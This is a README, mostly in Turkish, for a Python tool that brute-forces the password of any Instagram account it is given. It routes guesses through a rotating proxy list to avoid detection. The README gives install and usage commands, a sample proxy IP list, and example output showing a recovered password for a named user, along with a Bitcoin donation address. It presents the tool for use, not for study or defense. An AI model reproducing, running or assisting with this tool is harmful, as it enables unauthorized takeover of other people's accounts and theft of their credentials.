# Instagram Brute Force Attacker

[![Version](https://img.shields.io/badge/Version-3.1.0-green)]()
[![Python](https://img.shields.io/badge/Python-v3.9-yellow)]()


Bu program, bir proxy listesi verildiğinde, gönderdiğiniz herhangi bir Instagram hesabına kaba kuvvet uygulayacaktır.

### Notlar

Bu küçük bir deneme projesidir, geliştirmeye devam edilmeyecektir.

### Mali Destek

Projeye destek olmak isterseniz

**Bitcoin Wallet:** 1A9V9srcmERCg5AvHtkRLb3DbZyu2PM9ic<br/>


## Gereksinimler

- Python _v3.9_
- proxy list

## Kurulum Gereksinimleri

### Pipenv Kurulumu

```
pip install pipenv
```

### Çalışma Ortamı

Python 3.9 kurulu olmalıdır

```
pipenv --python 3.9
```

### Kurulum Gereksinimleri

```
pipenv install
```

## Yardim

```
usage: instagram.py [-h] [-u Kullanici] [-p Şifre Listesi] [-px Proxy Listesi] [--prune ISTISNA] [--stats] [-nc] [-m MODE]

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME, --username KullaniciAdi
                        eposta veya kullanıcı adı
  -p PASSLIST, --passlist PASSLIST
                        şifre listesi
  -px PROXYLIST, --proxylist PROXYLIST
                        proxy listesi
  --prune PRUNE         Veritabanından çıkar
  --stats               proxy istatistikleri
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
```

## Proxies

The system needs a list of proxies to work. Once uploaded, proxies are saved into a database.<br/>

### Upload

Upload a list of proxies into the program. The proxy file must have a format of `ip:port`<br/>

`proxies_list.txt`

```
51.79.248.208:28753
51.222.12.245:10084	
5.161.86.206:1080
66.42.224.229:41679
72.210.221.197:4145
184.178.172.25:15291
```

To upload a list of proxies a similar syntax must be followed.

```
python instagram.py -px <path to proxy list>
```

### Stats

This gives an insight into the health of the proxies in the database.

```
python instagram.py --stats
```

### Prune

This allows the able to get rid of proxies with a score below a given score.<br/>
It is recommended that you run the `--stats` and prune the database of proxies<br/>
who have a proxy score below `Q1`.

```
python instagram.py --prune 0.05
```

Pruning is not a requirement because the <br/>
the system will automatically learn which proxies perform poorly and stop using them.

### Usage

```
python instagram.py -u <username> -p <passlist>
```

### Run

```
[-] Wordlist: passlist.txt
[-] Username: Sami09.1
[-] Password: 272
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Stop

```
[-] Wordlist: passlist.txt
[-] Username: Sami09.1
[-] Password: Sami123
[-] Complete: 62.67%
[-] Attempts: 314
[-] Browsers: 185
[-] Exists: True

[!] Password Found
[+] Username: Sami09.1
[+] Password: Sami123
```
